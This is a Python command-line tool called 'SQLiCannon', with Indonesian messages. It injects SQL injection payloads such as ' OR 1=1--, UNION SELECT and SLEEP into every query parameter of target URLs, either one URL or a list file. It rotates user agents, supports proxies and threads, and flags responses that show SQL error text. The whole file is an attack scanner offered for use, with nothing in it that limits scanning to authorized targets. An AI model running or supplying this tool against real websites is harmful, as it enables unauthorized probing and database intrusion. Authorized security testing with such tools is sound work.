#!/usr/bin/env python3
import argparse
import sys
import os
import time
import random
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

class SQLiScanner:
    def __init__(self, proxy=None):
        self.proxy = proxy
        self.user_agents = self._load_user_agents()
        self.payloads = self._load_raw_payloads()  # Payload tanpa warna
        self.tested_urls = set()
        self.vulnerable = []
        self.request_count = 0

    def _load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
        ]

    def _load_raw_payloads(self):
        return [
            "' OR 1=1--",
            "\" OR \"a\"=\"a",
            "' UNION SELECT NULL--",
            "' OR SLEEP(5)--"
        ]

    def _print_banner(self):
        print(f"""{Fore.YELLOW}
███████╗ ██████╗ ██╗     ██╗     
██╔════╝██╔═══██╗██║     ██║     
███████╗██║   ██║██║     ██║     
╚════██║██║   ██║██║     ██║     
███████║╚██████╔╝███████╗███████╗
╚══════╝ ╚═════╝ ╚══════╝╚══════╝
        {Style.RESET_ALL}""")

    def _print_status(self, message, msg_type="INFO"):
        color_map = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "ERROR": Fore.RED,
            "WARNING": Fore.YELLOW
        }
        print(f"{color_map[msg_type]}[{msg_type}] {message}{Style.RESET_ALL}")

    def _test_param(self, url, param, payload):
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            query[param] = payload
            target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
            
            colored_payload = f"{Fore.MAGENTA}{payload}{Style.RESET_ALL}"
            self._print_status(f"Testing: {Fore.BLUE}{url}{Style.RESET_ALL} | Payload: {colored_payload}", "INFO")

            proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
            
            response = requests.get(
                target_url,
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=20,
                proxies=proxies,
                verify=True,  # verifikasi SSL
                allow_redirects=False
            )
            
            self.request_count += 1

            if response.status_code == 200:
                if any(err in response.text.lower() for err in ['sql', 'syntax', 'warning']):
                    self.vulnerable.append({
                        'url': target_url,
                        'param': param,
                        'payload': payload
                    })
                    self._print_status(f"Vulnerability Found! {Fore.GREEN}{target_url}{Style.RESET_ALL}", "SUCCESS")

        except requests.exceptions.RequestException as e:
            self._print_status(f"Connection Error: {str(e)}", "ERROR")
        except Exception as e:
            self._print_status(f"Unexpected Error: {str(e)}", "ERROR")

    def scan_url(self, url):
        if url in self.tested_urls:
            return
        self.tested_urls.add(url)
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in self.payloads:
                self._test_param(url, param, payload)

def main():
    parser = argparse.ArgumentParser(
        description=f"{Fore.YELLOW}SQLiCannon - Advanced SQL Injection Scanner{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        usage=f"""{Fore.CYAN}
Usage:
  python3 run1.py -u "URL"
  python3 run1.py -F --threads NUM{Style.RESET_ALL}"""
    )

    parser.add_argument("-F", action="store_true", help="Scan URLs dari file list.txt")
    parser.add_argument("-u", type=str, help="Scan URL tunggal")
    parser.add_argument("-p", "--proxy", type=str, help="Gunakan proxy (contoh: http://127.0.0.1:8080)")
    parser.add_argument("--threads", type=int, default=2, help="Jumlah thread paralel (default: 2)")

    args = parser.parse_args()

    if not args.F and not args.u:
        parser.print_help()
        sys.exit(1)

    scanner = SQLiScanner(proxy=args.proxy)
    scanner._print_banner()

    try:
        if args.F:
            if not os.path.exists("list.txt"):
                scanner._print_status("File list.txt tidak ditemukan!", "ERROR")
                sys.exit(1)
            
            with open("list.txt", "r") as f:
                urls = [line.strip() for line in f if line.strip()]
                
            scanner._print_status(f"Memulai scan {len(urls)} URL dengan {args.threads} threads...", "INFO")
            
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                executor.map(scanner.scan_url, urls)
                
        elif args.u:
            scanner._print_status(f"Memulai scan pada: {Fore.BLUE}{args.u}{Style.RESET_ALL}", "INFO")
            scanner.scan_url(args.u)

        scanner._print_status("\nHasil Scanning:", "WARNING")
        scanner._print_status(f"Total Permintaan: {scanner.request_count}", "INFO")
        scanner._print_status(f"Vulnerabilitas Ditemukan: {len(scanner.vulnerable)}", "SUCCESS" if scanner.vulnerable else "ERROR")
        
        for vuln in scanner.vulnerable:
            print(f"\n{Fore.GREEN}[+] URL: {vuln['url']}")
            print(f"{Fore.YELLOW}    Parameter: {vuln['param']}")
            print(f"{Fore.MAGENTA}    Payload: {vuln['payload']}{Style.RESET_ALL}")
            
    except KeyboardInterrupt:
        scanner._print_status("\nScan dihentikan oleh pengguna!", "ERROR")
        sys.exit(1)

if __name__ == "__main__":
    main()